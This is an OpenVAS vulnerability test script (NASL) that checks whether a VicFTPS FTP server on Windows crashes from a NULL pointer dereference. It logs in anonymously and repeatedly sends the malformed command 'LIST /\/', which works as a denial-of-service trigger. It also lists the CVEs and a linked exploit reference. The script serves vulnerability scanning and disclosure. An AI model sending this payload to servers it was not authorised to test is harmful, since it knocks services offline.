###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_vicftps_list_dos_vuln.nasl 13499 2019-02-06 12:55:20Z cfischer $
#
# VicFTPS LIST Command Denial of Service Vulnerability
#
# Authors:
# Nikita MR <rnikita@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900580");
  script_version("$Revision: 13499 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-06 13:55:20 +0100 (Wed, 06 Feb 2019) $");
  script_tag(name:"creation_date", value:"2009-06-26 07:55:21 +0200 (Fri, 26 Jun 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2008-6829", "CVE-2008-2031");
  script_bugtraq_id(28967);
  script_name("VicFTPS LIST Command Denial of Service Vulnerability");
  script_xref(name:"URL", value:"http://milw0rm.com/exploits/6834");
  script_xref(name:"URL", value:"http://secunia.com/advisories/29943");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Denial of Service");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "os_detection.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/vicftps/detected", "Host/runs_windows");

  script_tag(name:"impact", value:"Successful exploitation allows attackers to execute arbitrary
code, and can crash the affected application.");

  script_tag(name:"affected", value:"VicFTPS Version 5.0 and prior on Windows.");

  script_tag(name:"insight", value:"A NULL pointer dereference error exists while processing
malformed arguments passed to a LIST command that starts with a '/\/' (forward
slash, backward slash, forward slash).");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running VicFTPS FTP Server which is prone to
Denial of Service Vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");
include("version_func.inc");

vicPort = get_ftp_port(default:21);
banner = get_ftp_banner(port:vicPort);
if(!banner || "VicFTPS" >!< banner)
  exit(0);

soc = open_sock_tcp(vicPort);
if(!soc)
  exit(0);

if(!ftp_authenticate(socket:soc, user:"anonymous", pass:"anonymous"))
  exit(0);

for(i = 0; i < 3; i++)
{
  cmd = "LIST /\/";
  ftp_send_cmd(socket:soc, cmd:cmd);
  sleep(5);
  ftp_close(soc);

  soc = open_sock_tcp(vicPort);
  if(!soc) {
     security_message(port:vicPort);
     exit(0);
  } else {
    if(!ftp_authenticate(socket:soc, user:"anonymous", pass:"anonymous")) {
      security_message(port:vicPort);
      exit(0);
    }
    ftp_close(soc);
  }
}
